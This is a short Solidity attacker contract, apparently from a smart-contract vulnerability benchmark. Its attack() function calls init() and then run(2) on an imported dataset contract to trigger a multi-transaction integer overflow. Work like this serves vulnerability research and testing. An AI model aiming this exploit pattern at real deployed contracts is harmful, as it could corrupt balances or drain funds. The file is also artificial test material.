pragma solidity ^0.8.0;

import "../dataset/arithmetic/integer_overflow_multitx_multifunc_feasible.sol";

contract IntegerOverflowMultiTxMultiFuncFeasibleAttacker {
    IntegerOverflowMultiTxMultiFuncFeasible public target;

    constructor (address _targetAddress) {
        target = IntegerOverflowMultiTxMultiFuncFeasible(_targetAddress);
    }

    function attack() public {
        target.init();

        target.run(2);
    }
}